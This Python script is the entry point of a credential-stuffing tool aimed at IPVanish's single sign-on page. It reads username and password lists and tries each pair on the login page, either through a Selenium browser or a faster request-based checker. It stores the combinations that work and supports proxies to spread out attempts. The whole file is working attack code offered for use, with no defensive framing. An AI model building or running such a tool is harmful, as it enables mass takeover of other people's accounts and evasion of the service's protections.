import time
import platform
from pathlib import Path
from subprocess import run
from subprocess import PIPE
from gui import sub_menu
from gui import text_user_interface
from browser_init import BrowserInit
from download_chromedriver import DownloadChromedriver
from requests_checker import RequestsChecker

if __name__ == '__main__':
    if platform.system() != "Linux":
        print("Please run this program in a Linux distribution.")
        print("Other Operating Systems are not supported.")
        print("Ending")
        exit()
    else:
        chromedriver_is_installed = False
        directory = "/home/roberto/Desktop/cookie.json"
        page = "https://sso.ipvanish.com/"
        chromedriver_directory = str(Path(__file__).parent) + '/chromedriver/chromedriver'
        command_as_list = ['google-chrome-stable', '--version']
        try:
            open(chromedriver_directory, 'r')
            chromedriver_is_installed = True
        except FileNotFoundError:
            pass
        is_using_proxies = 0
        proxy_user, proxy_password = None, None
        loop_ends = False
        counter = 0
        while not loop_ends:
            command = run(command_as_list, shell=False, stdout=PIPE)
            chrome_version = str(command.stdout).split(" ")[2]
            TUI = text_user_interface(is_using_proxies, chrome_version, chromedriver_is_installed)
            if not chromedriver_is_installed:
                download_chromeDriver = DownloadChromedriver(chrome_version)
                download_chromeDriver.start()
                download_chromeDriver.file_operations()
                chromedriver_is_installed = True
            else:
                browser = BrowserInit(page)
                try:
                    match TUI:
                        case "1":
                            while True:
                                user, password = browser.get_and_split_list()
                                if counter == len(user):
                                    loop_ends = True
                                    break
                                browser.open_page_and_enter_credentials(user[counter], password[counter])
                                time.sleep(2)
                                browser.check_validity_and_store_if_valid(user[counter], password[counter])
                                counter += 1
                        case "2":
                            index = 0
                            while True:
                                fast_checker = RequestsChecker()
                                user, password = fast_checker.split_list()
                                if counter == len(user):
                                    loop_ends = True
                                    break
                                fast_checker.make_request(user[counter], password[counter], index)
                                counter += 1
                                if index == 22:
                                    index = 0
                                else:
                                    index += 1
                        case "3":
                            proxy_user, proxy_password = sub_menu()
                            is_using_proxies = 1
                        case "4":
                            print("\nThanks for playing.")
                            exit()
                        case _:
                            print("Invalid Choice.")
                            input("Press Enter...")
                            print("\x1bc")
                except Exception as e:
                    if "Unable to obtain driver for chrome" in str(e):
                        print("There is a problem with your chromedriver installation:")
                        print("1) Run the shell script included with superuser privileges")
                        print("2) Fix the problem yourself")
                        print("\nEnding")
                        exit()
                    else:
                        print("Encountered an unexpected error.\nYou can create an issue and include the following error:")
                        print(e)
                        print("\nEnding.")
                        exit()
